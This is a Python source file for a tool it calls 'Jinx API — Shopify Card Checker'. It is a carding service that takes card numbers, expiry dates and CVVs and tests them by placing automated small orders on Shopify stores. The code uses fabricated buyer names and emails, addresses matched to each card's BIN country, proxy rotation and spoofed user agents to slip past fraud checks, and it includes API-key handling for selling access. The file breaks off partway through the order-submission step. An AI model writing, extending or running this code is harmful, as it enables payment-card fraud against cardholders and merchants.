#!/usr/bin/env python3
"""
Jinx API — Shopify Card Checker (v3.0 PRO)
============================================
Full Proposal → Delivery → Submit → Poll workflow
Compatible with bot.py load balancer

Response format: {"Response": "...", "Price": "...", "Gateway": "..."}
Endpoint: GET /Shopify?site=<url>&cc=<cc|mm|yyyy|cvv>&proxy=<optional>
"""

import sys
import os
import re
import json
import time
import random
import threading
import secrets
import sqlite3
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

try:
    import requests
except ImportError:
    print("❌ pip install requests")
    sys.exit(1)

try:
    import socks  # noqa
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False


# ============================================================
# BRAND
# ============================================================
BRAND = "Jinx"
VERSION = "3.0.0"
DB_PATH = "jinx_api_keys.db"


# ============================================================
# CONFIG
# ============================================================
PRICE_MIN = 2.00
PRICE_MAX = 25.00
MAX_RETRIES = 3
SOFT_ERRORS = {
    "WAITING_PENDING_TERMS",
    "TAX_NEW_TAX_MUST_BE_ACCEPTED",
    "PENDING_TERMS",
    "PROCESSING",
}


# ============================================================
# ADDRESS BOOK
# ============================================================
BOOK = {
    "US": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
           "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
           "state": "Maine", "currency": "USD"},
    "CA": {"address1": "88 Queen St W", "city": "Toronto", "postalCode": "M5H2M5",
           "zoneCode": "ON", "countryCode": "CA", "phone": "+14165551234",
           "state": "Ontario", "currency": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW16XE",
           "zoneCode": "LND", "countryCode": "GB", "phone": "+442079460123",
           "state": "London", "currency": "GBP"},
    "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001",
           "zoneCode": "MH", "countryCode": "IN", "phone": "+919876543210",
           "state": "Maharashtra", "currency": "INR"},
    "AE": {"address1": "Burj Khalifa Tower", "city": "Dubai", "postalCode": "00000",
           "zoneCode": "DU", "countryCode": "AE", "phone": "+971501234567",
           "state": "Dubai", "currency": "AED"},
    "HK": {"address1": "Nathan Road 88", "city": "Kowloon", "postalCode": "999077",
           "zoneCode": "KL", "countryCode": "HK", "phone": "+85255555555",
           "state": "Kowloon", "currency": "HKD"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Zurich", "postalCode": "8002",
           "zoneCode": "ZH", "countryCode": "CH", "phone": "+4144512345",
           "state": "Zurich", "currency": "CHF"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000",
           "zoneCode": "NSW", "countryCode": "AU", "phone": "+61291234567",
           "state": "New South Wales", "currency": "AUD"},
    "MX": {"address1": "Av. Reforma 222", "city": "Ciudad de Mexico", "postalCode": "06600",
           "zoneCode": "CMX", "countryCode": "MX", "phone": "+525555555555",
           "state": "Ciudad de Mexico", "currency": "MXN"},
    "BR": {"address1": "Av. Paulista 1578", "city": "Sao Paulo", "postalCode": "01310200",
           "zoneCode": "SP", "countryCode": "BR", "phone": "+5511999999999",
           "state": "Sao Paulo", "currency": "BRL"},
    "DE": {"address1": "Friedrichstrasse 100", "city": "Berlin", "postalCode": "10117",
           "zoneCode": "BE", "countryCode": "DE", "phone": "+4930123456",
           "state": "Berlin", "currency": "EUR"},
    "JP": {"address1": "1-1 Chiyoda", "city": "Tokyo", "postalCode": "100-8111",
           "zoneCode": "TK", "countryCode": "JP", "phone": "+81312345678",
           "state": "Tokyo", "currency": "JPY"},
    "DEFAULT": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
                "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
                "state": "Maine", "currency": "USD"},
}


# ============================================================
# BIN LOOKUP
# ============================================================
_bin_cache = {}
_bin_lock = threading.Lock()


def lookup_bin_country(bin6):
    bin6 = str(bin6)[:6]
    if not bin6.isdigit():
        return "US"
    with _bin_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            country = (data.get("country_code") or
                       data.get("country_alpha2") or "US").upper()
            with _bin_lock:
                _bin_cache[bin6] = country
            return country
    except Exception:
        pass
    with _bin_lock:
        _bin_cache[bin6] = "US"
    return "US"


def pick_address(country_code):
    return BOOK.get((country_code or "US").upper(), BOOK["DEFAULT"])


# ============================================================
# PROXY PARSER
# ============================================================
SOCKS5_PORTS = {1080, 1081, 1082, 1083, 1084, 1085, 4145, 9050, 9150}
SOCKS4_PORTS = {4146}


def parse_proxy_string(p):
    if not p:
        return None
    p = p.strip()
    if not p or p.startswith("#"):
        return None
    hint = None
    m = re.search(r'\s*\(\s*([A-Za-z0-9]+)\s*\)\s*$', p)
    if m:
        hint = m.group(1).upper()
        p = p[:m.start()].strip()
    if p.startswith("socks5://") or p.startswith("socks5h://"):
        return ("socks5", p.replace("socks5h://", "socks5://"))
    if p.startswith("socks4://"):
        return ("socks4", p)
    if p.startswith("http://") or p.startswith("https://"):
        return ("http", p)
    if "@" in p:
        scheme = (hint or "http").lower()
        if scheme not in ("http", "socks4", "socks5"):
            scheme = "http"
        return (scheme, f"{scheme}://{p}")
    parts = p.split(":")
    if len(parts) == 4:
        ip, port_s, user, pw = parts
        try:
            port = int(port_s)
        except ValueError:
            return None
        if hint == "SOCKS5":
            scheme = "socks5"
        elif hint == "SOCKS4":
            scheme = "socks4"
        elif hint in ("HTTP", "HTTPS"):
            scheme = "http"
        elif port in SOCKS5_PORTS:
            scheme = "socks5"
        elif port in SOCKS4_PORTS:
            scheme = "socks4"
        else:
            scheme = "http"
        return (scheme, f"{scheme}://{user}:{pw}@{ip}:{port}")
    if len(parts) == 2:
        ip, port_s = parts
        try:
            port = int(port_s)
        except ValueError:
            return None
        if hint == "SOCKS5":
            scheme = "socks5"
        elif hint == "SOCKS4":
            scheme = "socks4"
        elif hint in ("HTTP", "HTTPS"):
            scheme = "http"
        elif port in SOCKS5_PORTS:
            scheme = "socks5"
        elif port in SOCKS4_PORTS:
            scheme = "socks4"
        else:
            scheme = "http"
        return (scheme, f"{scheme}://{ip}:{port}")
    return None


def build_proxies_dict(proxy_str):
    parsed = parse_proxy_string(proxy_str)
    if not parsed:
        return None, None
    scheme, url = parsed
    if scheme in ("socks4", "socks5") and not HAS_SOCKS:
        return None, "no_socks"
    return {"http": url, "https": url}, scheme


# ============================================================
# SQLITE (optional API keys)
# ============================================================
_db_lock = threading.Lock()


def _init_db():
    conn = sqlite3.connect(DB_PATH)
    try:
        conn.execute("""CREATE TABLE IF NOT EXISTS api_keys (
            key TEXT PRIMARY KEY,
            created_at INTEGER NOT NULL,
            expires_at INTEGER,
            label TEXT,
            active INTEGER DEFAULT 1,
            uses INTEGER DEFAULT 0,
            last_used INTEGER
        )""")
        conn.commit()
    finally:
        conn.close()


# ============================================================
# FAKER
# ============================================================
FIRST = ["James", "John", "Robert", "Michael", "William", "David",
         "Mary", "Patricia", "Jennifer", "Linda", "Ahmed", "Mohamed",
         "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah"]
LAST = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
        "Miller", "Davis", "Rodriguez", "Khalil", "Abdullah", "Alwan",
        "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Ahmed"]


def random_name():
    return random.choice(FIRST), random.choice(LAST)


# ============================================================
# HELPER
# ============================================================
def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                return parts[1].split(end, 1)[0] or None
    except Exception:
        pass
    return None


def extract_code(text):
    if not text:
        return "UNKNOWN"
    t = str(text)
    for pat in [r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)',
                r'([A-Z]+_[A-Z]+_[A-Z_]+)', r'([A-Z]+_[A-Z]+)']:
        for m in re.findall(pat, t, re.IGNORECASE):
            if isinstance(m, tuple):
                m = m[0]
            if m and "_" in m and len(m) < 60:
                return m.strip("{}:'\" ")
    for w in t.split():
        if w.isupper() and "_" in w and len(w) > 3:
            return w.strip("{}:'\" ")
    return t.strip()[:60] or "UNKNOWN"


# ============================================================
# SHOPIFY CHECKER — Full Workflow
# ============================================================
class Shopify:
    SOFT_ERRORS = SOFT_ERRORS

    def __init__(self, domain, proxy_dict=None):
        self.domain = domain if domain.startswith("http") else f"https://{domain}"
        self.domain = self.domain.rstrip("/")
        self.session = requests.Session()
        self.proxy_dict = proxy_dict
        self.user_agent = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        ])
        self.product = None
        self.user_info = None
        self.country_code = "US"
        self.address = BOOK["DEFAULT"]
        self.currency = "USD"

        # Session tokens
        self.session_token = None
        self.queue_token = None
        self.stable_id = None
        self.merchandise_id = None
        self.checkout_url = None
        self.attempt_token = None

        # Proposal-derived values
        self.payment_identifier = None
        self.shipping_handle = ""
        self.shipping_amount = 0.0
        self.tax_amount = 0.0
        self.subtotal = "0.00"
        self.running_total = "0.00"
        self.checkpoint_data = None
        self.gateway = "Shopify"

        if proxy_dict:
            self.session.proxies.update(proxy_dict)

    # ---------- low-level ----------
    def _req(self, method, url, **kw):
        for _ in range(2):
            try:
                return self.session.request(method, url, timeout=30, **kw)
            except Exception:
                continue
        return None

    def _json(self, r):
        if not r:
            return None
        try:
            return r.json()
        except Exception:
            return None

    # ---------- setup ----------
    def set_card_country(self, cc_number):
        self.country_code = lookup_bin_country(cc_number[:6])
        self.address = pick_address(self.country_code)
        self.currency = self.address.get("currency", "USD")

    def get_user_info(self):
        if self.user_info:
            return self.user_info
        fn, ln = random_name()
        email = f"{fn.lower()}.{ln.lower()}{random.randint(1, 9999)}@gmail.com"
        self.user_info = {
            "fname": fn, "lname": ln, "email": email,
            "phone": self.address["phone"],
            "add": self.address["address1"],
            "city": self.address["city"],
            "state": self.address["state"],
            "state_short": self.address["zoneCode"],
            "zip": self.address["postalCode"],
        }
        return self.user_info

    # ---------- products ----------
    def get_products(self):
        if self.product:
            return self.product
        r = self._req("GET", f"{self.domain}/products.json",
                      headers={"Accept": "application/json"})
        if not r:
            return None
        data = self._json(r)
        if not data:
            return None
        products = data.get("products", [])
        if not products:
            return None

        blacklist = ["sample", "free", "gift", "test", "donation", "tip"]
        valid = []
        for p in products:
            title = (p.get("title") or "").lower()
            if any(w in title for w in blacklist):
                continue
            for v in p.get("variants", []):
                if not v.get("available", True):
                    continue
                try:
                    price = float(str(v.get("price", 999)).replace(",", ""))
                except Exception:
                    continue
                if PRICE_MIN <= price <= PRICE_MAX:
                    valid.append({
                        "title": p["title"], "handle": p["handle"],
                        "variant_id": v["id"], "price": price,
                    })
        if not valid:
            return None
        # Mid-range to reduce PAYMENT_AMOUNT_INVALID
        valid.sort(key=lambda x: x["price"])
        mid = min(len(valid) // 2, len(valid) - 1)
        self.product = valid[mid]
        return self.product

    # ---------- cart ----------
    def visit_product_page(self):
        p = self.get_products()
        if not p:
            return False
        r = self._req("GET", f"{self.domain}/products/{p['handle']}",
                      headers={"Accept": "text/html,*/*;q=0.8",
                               "Referer": f"{self.domain}/"})
        return bool(r)

    def add_to_cart(self):
        p = self.get_products()
        if not p:
            return False
        h = {"Accept": "application/json",
             "Content-Type": "application/x-www-form-urlencoded",
             "Referer": f"{self.domain}/"}
        self._req("GET", f"{self.domain}/cart.js", headers=h)
        r = self._req("POST", f"{self.domain}/cart/add.js", headers=h,
                      data=f"id={p['variant_id']}&quantity=1&form_type=product")
        if not r or r.status_code != 200:
            h2 = {**h, "Content-Type": "application/json"}
            r = self._req("POST", f"{self.domain}/cart/add.js", headers=h2,
                          json={"items": [{"id": int(p["variant_id"]), "quantity": 1}]})
        return r is not None and r.status_code == 200

    def init_checkout(self):
        h = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Content-Type": "application/x-www-form-urlencoded",
             "Origin": self.domain, "Referer": f"{self.domain}/cart",
             "Upgrade-Insecure-Requests": "1"}
        self._req("GET", f"{self.domain}/checkout", headers=h)
        r = self._req("POST", f"{self.domain}/cart", headers=h,
                      data={"checkout": "", "updates[]": "1"},
                      allow_redirects=True)
        if not r:
            return False
        text = r.text or ""
        final_url = str(r.url)
        self.checkout_url = final_url

        sst = r.headers.get("X-Checkout-One-Session-Token") or \
              r.headers.get("x-checkout-one-session-token")
        if not sst:
            for pat in [
                r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
                r'"serializedSessionToken":"([^"]+)"',
                r'"sessionToken":"([^"]+)"',
                r'data-session-token="([^"]+)"',
            ]:
                m = re.search(pat, text)
                if m:
                    sst = m.group(1)
                    break
        self.session_token = sst

        m = re.search(r'/checkouts/cn/([^/?]+)', final_url)
        self.attempt_token = m.group(1) if m else final_url.split("/")[-1].split("?")[0]

        unescaped = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
        self.queue_token = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or \
                           extract_between(unescaped, '"queueToken":"', '"')
        self.stable_id = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or \
                         extract_between(unescaped, '"stableId":"', '"')

        merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                extract_between(unescaped, 'ProductVariantMerchandise/', '"')
        p = self.get_products()
        self.merchandise_id = merch or (str(p["variant_id"]) if p else None)

        cur = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or \
              extract_between(unescaped, '"currencyCode":"', '"')
        if cur:
            self.currency = cur

        sub = extract_between(
            text,
            'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
            '&quot;'
        ) or extract_between(
            unescaped,
            '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"'
        )
        if not sub:
            m2 = re.search(r'"price":\s*"([\d.]+)"', text)
            sub = m2.group(1) if m2 else "0.01"
        self.subtotal = sub

        return bool(self.session_token)

    def create_payment_session(self, cc, mon, year, cvv):
        ui = self.get_user_info()
        if len(str(year)) == 2:
            year = "20" + str(year)
        for ep in [
            "https://checkout.pci.shopifyinc.com/sessions",
            "https://deposit.us.shopifycs.com/sessions",
            "https://checkout.shopifycs.com/sessions",
        ]:
            try:
                h = {"Accept": "application/json", "Content-Type": "application/json",
                     "Origin": "https://checkout.pci.shopifyinc.com",
                     "Referer": "https://checkout.pci.shopifyinc.com/",
                     "User-Agent": self.user_agent}
                payload = {
                    "credit_card": {
                        "number": str(cc).replace(" ", ""),
                        "month": int(mon), "year": int(year),
                        "verification_value": str(cvv),
                        "name": f"{ui['fname']} {ui['lname']}",
                    },
                    "payment_session_scope": urlparse(self.domain).netloc,
                }
                r = self.session.post(ep, headers=h, json=payload, timeout=30)
                if r.status_code == 200:
                    j = self._json(r)
                    if j and j.get("id"):
                        return j["id"]
            except Exception:
                continue
        return None

    # ---------- GraphQL ----------
    def _gql_headers(self):
        return {
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": self.domain,
            "Referer": f"{self.domain}/",
            "User-Agent": self.user_agent,
            "X-Checkout-One-Session-Token": self.session_token or "",
            "shopify-checkout-client": "checkout-web/1.0",
            "shopify-checkout-source": f'id="{self.attempt_token}", type="cn"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }

    def _gql_post(self, payload):
        r = self._req("POST", f"{self.domain}/checkouts/unstable/graphql",
                      headers=self._gql_headers(), json=payload)
        if not r:
            return None, ""
        try:
            return r.status_code, r.text
        except Exception:
            return r.status_code, ""

    # ---------- PROPOSAL (Shipping) ----------
    def proposal_shipping(self):
        ui = self.get_user_info()
        p = self.get_products()
        if not p:
            return {"status": "failed", "reason": "no_product"}

        addr = {
            "address1": ui["add"], "address2": "", "city": ui["city"],
            "countryCode": self.country_code, "postalCode": ui["zip"],
            "firstName": ui["fname"], "lastName": ui["lname"],
            "zoneCode": ui["state_short"], "phone": ui["phone"],
        }

        query = (
            "query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,"
            "$delivery:DeliveryTermsInput,$merchandise:MerchandiseTermInput,"
            "$payment:PaymentTermInput,$buyerIdentity:BuyerIdentityTermInput,"
            "$discounts:DiscountTermsInput,$taxes:TaxTermInput){"
            "session(sessionInput:$sessionInput){negotiate(input:{"
            "purchaseProposal:{delivery:$delivery,merchandise:$merchandise,"
            "payment:$payment,buyerIdentity:$buyerIdentity,discounts:$discounts,"
            "taxes:$taxes},queueToken:$queueToken}){__typename result{"
            "...on NegotiationResultAvailable{checkpointData queueToken "
            "sellerProposal{runningTotal{value{amount currencyCode __typename}__typename}"
            "subtotalBeforeTaxesAndShipping{value{amount currencyCode __typename}__typename}"
            "delivery{...on FilledDeliveryTerms{deliveryLines{"
            "availableDeliveryStrategies{handle amount{value{amount currencyCode __typename}__typename}__typename}"
            "__typename}__typename}__typename}"
            "payment{...on FilledPaymentTerms{availablePaymentLines{"
            "paymentMethod{name paymentMethodIdentifier __typename}__typename}__typename}__typename}"
            "tax{...on FilledTaxTerms{totalTaxAmount{value{amount currencyCode __typename}__typename}__typename}__typename}"
            "__typename}__typename}...on CheckpointDenied{redirectUrl __typename}"
            "...on Throttled{pollAfter queueToken __typename}__typename}__typename}}"
        )

        variables = {
            "sessionInput": {"sessionToken": self.session_token},
            "queueToken": self.queue_token or "",
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": {"partialStreetAddress": addr},
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True},
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True,
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id or "1",
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.merchandise_id}",
                            "variantId": f"gid://shopify/ProductVariant/{p['variant_id']}",
                            "properties": [], "sellingPlanId": None,
                            "sellingPlanDigest": None,
                        },
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"value": {
                        "amount": self.subtotal, "currencyCode": self.currency,
                    }},
                    "lineComponentsSource": None,
                    "lineComponents": [],
                }],
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": {
                    "address1": "", "city": "",
                    "countryCode": self.country_code,
                    "lastName": "", "zoneCode": ui["state_short"], "phone": "",
                }},
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": self.currency,
                    "countryCode": self.country_code,
                },
                "email": ui["email"], "emailChanged": False,
                "phoneCountryCode": self.country_code,
                "marketingConsent": [{"email": {"value": ui["email"]}}],
                "shopPayOptInPhone": {"countryCode": self.country_code},
                "rememberMe": False,
            },
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {
                    "amount": "0", "currencyCode": self.currency,
                }},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": [],
            },
        }

        code, text = self._gql_post({
            "query": query, "variables": variables, "operationName": "Proposal",
        })
        if code is None:
            return {"status": "failed", "reason": "network_error"}

        if "CAPTCHA_REQUIRED" in text:
            return {"status": "rejected", "errors": ["CAPTCHA_REQUIRED"]}

        data = None
        try:
            data = json.loads(text)
        except Exception:
            return {"status": "failed", "reason": "invalid_json_proposal"}

        if "errors" in data:
            return {"status": "rejected",
                    "errors": [extract_code(str(e)) for e in data["errors"][:2]]}

        try:
            result = data["data"]["session"]["negotiate"]["result"]
        except (KeyError, TypeError):
            return {"status": "failed", "reason": "empty_proposal"}

        tn = result.get("__typename", "")
        if tn == "CheckpointDenied":
            return {"status": "rejected", "errors": ["CHECKPOINT_DENIED"]}
        if tn == "Throttled":
            return {"status": "failed", "reason": "throttled"}
        if tn != "NegotiationResultAvailable":
            return {"status": "failed", "reason": f"proposal_{tn}"}

        try:
            self.checkpoint_data = result.get("checkpointData")
            seller = result["sellerProposal"]
            self.running_total = seller["runningTotal"]["value"]["amount"]
            sub = seller.get("subtotalBeforeTaxesAndShipping", {}).get("value", {})
            if sub and sub.get("amount"):
                self.subtotal = sub["amount"]

            # Shipping
            dl = seller.get("delivery", {}).get("deliveryLines", [])
            if dl and dl[0].get("availableDeliveryStrategies"):
                strat = dl[0]["availableDeliveryStrategies"][0]
                self.shipping_handle = strat.get("handle", "")
                try:
                    self.shipping_amount = float(strat["amount"]["value"]["amount"])
                except Exception:
                    self.shipping_amount = 0.0

            # Tax
            tax = seller.get("tax", {})
            if tax.get("__typename") == "FilledTaxTerms":
                try:
                    self.tax_amount = float(tax["totalTaxAmount"]["value"]["amount"])
                except Exception:
                    self.tax_amount = 0.0

            # Payment method
            payment = seller.get("payment", {})
            if payment.get("__typename") == "FilledPaymentTerms":
                for pl in payment.get("availablePaymentLines", []):
                    pm = pl.get("paymentMethod", {})
                    if pm.get("paymentMethodIdentifier"):
                        self.payment_identifier = pm["paymentMethodIdentifier"]
                        self.gateway = pm.get("name", "Shopify") or "Shopify"
                        break

            if not self.payment_identifier:
                return {"status": "rejected", "errors": ["NO_PAYMENT_METHOD"]}

            return {"status": "ok"}
        except (KeyError, TypeError) as e:
            return {"status": "failed", "reason": f"proposal_parse: {str(e)[:40]}"}

    # ---------- PROPOSAL (Delivery) ----------
    def proposal_delivery(self):
        ui = self.get_user_info()
        p = self.get_products()
        if not p:
            return {"status": "failed"}

        addr = {
            "address1": ui["add"], "address2": "", "city": ui["city"],
            "countryCode": self.country_code, "postalCode": ui["zip"],
            "firstName": ui["fname"], "lastName": ui["lname"],
            "zoneCode": ui["state_short"], "phone": ui["phone"],
        }

        query = (
            "query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,"
            "$delivery:DeliveryTermsInput,$merchandise:MerchandiseTermInput,"
            "$payment:PaymentTermInput,$buyerIdentity:BuyerIdentityTermInput,"
            "$discounts:DiscountTermsInput,$taxes:TaxTermInput){"
            "session(sessionInput:$sessionInput){negotiate(input:{"
            "purchaseProposal:{delivery:$delivery,merchandise:$merchandise,"
            "payment:$payment,buyerIdentity:$buyerIdentity,discounts:$discounts,"
            "taxes:$taxes},queueToken:$queueToken}){__typename result{"
            "...on NegotiationResultAvailable{checkpointData "
            "sellerProposal{runningTotal{value{amount currencyCode __typename}__typename}"
            "payment{...on FilledPaymentTerms{availablePaymentLines{"
            "paymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}"
            "__typename}__typename}...on CheckpointDenied{redirectUrl __typename}__typename}__typename}}"
        )

        variables = {
            "sessionInput": {"sessionToken": self.session_token},
            "queueToken": self.queue_token or "",
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": {"streetAddress": addr},
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": self.shipping_handle or "",
                            "customDeliveryRate": False,
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id or "1"}]},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"value": {
                        "amount": str(self.shipping_amount), "currencyCode": self.currency,
                    }},
                    "destinationChanged": False,
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id or "1",
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.merchandise_id}",
                            "variantId": f"gid://shopify/ProductVariant/{p['variant_id']}",
                            "properties": [], "sellingPlanId": None,
                            "sellingPlanDigest": None,
                        },
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"value": {
                        "amount": self.subtotal, "currencyCode": self.currency,
                    }},
                    "lineComponentsSource": None,
                    "lineComponents": [],
                }],
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": addr},
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": self.currency,
                    "countryCode": self.country_code,
                },
                "email": ui["email"], "emailChanged": False,
                "phoneCountryCode": self.country_code,
                "marketingConsent": [{"email": {"value": ui["email"]}}],
                "shopPayOptInPhone": {"countryCode": self.country_code},
                "rememberMe": False,
            },
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {
                    "amount": str(self.tax_amount), "currencyCode": self.currency,
                }},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": [],
            },
        }

        code, text = self._gql_post({
            "query": query, "variables": variables, "operationName": "Proposal",
        })
        if code is None:
            return {"status": "failed"}

        try:
            data = json.loads(text)
            result = data["data"]["session"]["negotiate"]["result"]
            self.checkpoint_data = result.get("checkpointData") or self.checkpoint_data
            return {"status": "ok"}
        except Exception:
            return {"status": "ok"}  # non-critical

    # ---------- SUBMIT ----------
    def submit(self, cc, mon, year, cvv):
        ui = self.get_user_info()
        p = self.get_products()
        if not p or not self.payment_identifier:
            return {"status": "failed", "reason": "missing_payment_method"}

        token = self.create_payment_session(cc, mon, year, cvv)
        if not token:
            return {"status": "failed", "reason": "payment_session_failed"}

        addr = {
            "address1": ui["add"], "address2": "", "city": ui["city"],
            "countryCode": self.country_code, "postalCode": ui["zip"],
            "firstName": ui["fname"], "lastName": ui["lname"],
            "zoneCode": ui["state_short"], "phone": ui["phone"],
        }

        query = (
            "mutation SubmitForCompletion($input:NegotiationInput!,"
            "$attemptToken:String!,$metafields:[MetafieldInput!],"
            "$analytics:AnalyticsInput){submitForCompletion(input:$input "
            "attemptToken:$attemptToken metafields:$metafields analytics:$analytics){"
            "...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
            "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
            "...on SubmitFailed{reason __typename}"
            "...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}"
            "...on Throttled{pollAfter queueToken __typename}"
            "...on CheckpointDenied{redirectUrl __typename}"
            "...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}"
            "fragment ReceiptDetails on Receipt{"
            "...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
            "...on ProcessingReceipt{id pollDelay __typename}"
            "...on WaitingReceipt{id pollDelay __typename}"
            "...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
            "...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"
        )

        variables = {
            "input": {
                "sessionInput": {"sessionToken": self.session_token},
                "queueToken": self.queue_token or "",
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "destination": {"streetAddress": addr},
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle": self.shipping_handle or "",
                                "customDeliveryRate": False,
                            },
                            "options": {"phone": ui["phone"]},
                        },
                        "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id or "1"}]},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"value": {
                            "amount": str(self.shipping_amount), "currencyCode": self.currency,
                        }},
                        "destinationChanged": False,
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": True,
                    "prefetchShippingRatesStrategy": None,
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": self.stable_id or "1",
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{self.merchandise_id}",
                                "variantId": f"gid://shopify/ProductVariant/{p['variant_id']}",
                                "properties": [], "sellingPlanId": None,
                                "sellingPlanDigest": None,
                            },
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"value": {
                            "amount": self.subtotal, "currencyCode": self.currency,
                        }},
                        "lineComponentsSource": None,
                        "lineComponents": [],
                    }],
                },
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": self.payment_identifier,
                                "sessionId": token,
                                "billingAddress": {"streetAddress": addr},
                                "cardSource": None,
                            },
                        },
                        "amount": {"value": {
                            "amount": self.running_total, "currencyCode": self.currency,
                        }},
                        "dueAt": None,
                    }],
                    "billingAddress": {"streetAddress": addr},
                },
                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": self.currency,
                        "countryCode": self.country_code,
                    },
                    "email": ui["email"], "emailChanged": False,
                    "phoneCountryCode": self.country_code,
                    "marketingConsent": [{"email": {"value": ui["email"]}}],
                    "shopPayOptInPhone": {"number": ui["phone"], "countryCode": self.country_code},
                    "rememberMe": False,
                },
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {
                        "amount": str(self.tax_amount), "currencyCode": self.currency,
                    }},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": [],
                },
                "tip": {"tipLines": []},
                "note": {"message": None, "customAttributes": []},
